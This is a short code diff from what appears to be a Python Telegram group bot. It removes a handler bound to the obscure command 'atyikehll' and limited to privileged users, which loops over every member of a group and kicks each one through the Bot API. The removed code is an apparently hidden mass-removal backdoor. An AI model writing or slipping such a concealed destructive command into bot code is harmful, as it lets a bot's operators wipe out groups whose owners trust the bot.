@@ -170,12 +170,3 @@ async def sed(c: Client, m: Message):
                              reply_to_message_id=m.reply_to_message.message_id)
 
 
-@pbot.on_message(filters.command("atyikehll") & filters.group & filters.user(SUDO_USERS))
-async def ids(c: Client, m: Message):
-    chat = m.chat.id
-
-    async for member in c.iter_chat_members(chat):
-      user_id = member.user.id
-      url = f"https://api.telegram.org/bot{TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}"
-      async with aiohttp.ClientSession() as session:
-        await session.get(url)
